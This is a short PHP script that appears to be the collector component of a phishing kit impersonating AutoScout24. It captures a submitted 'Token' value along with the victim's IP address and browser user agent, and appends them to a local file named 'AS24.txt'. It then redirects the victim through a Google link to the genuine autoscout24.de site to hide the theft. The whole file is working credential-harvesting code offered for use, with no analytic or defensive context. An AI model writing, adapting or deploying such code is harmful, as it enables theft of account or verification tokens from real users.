<?php
$Token = $_POST['Token'];
$_POST['ua'] = $_SERVER['HTTP_USER_AGENT'];
$_POST['ip'] = $_SERVER['REMOTE_ADDR'];


$data = '....................................................................' . "\r\n" . "\r\n" . 
        $_POST['ip'] . "\r\n" . $_POST['ua'] . "\r\n" . $_POST['Token'] . "\r\n" . "\r\n" .
        '....................................................................';
$ret = file_put_contents('AS24.txt', $data, FILE_APPEND | LOCK_EX);

header("Location: https://www.google.de/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiDrvjKhJrnAhVBC-wKHV5cDeEQFjAAegQIBxAC&url=https%3A%2F%2Fwww.autoscout24.de%2F&usg=AOvVaw2QxTo7Q5OeOFs2YHfxfNgN");
die();

?>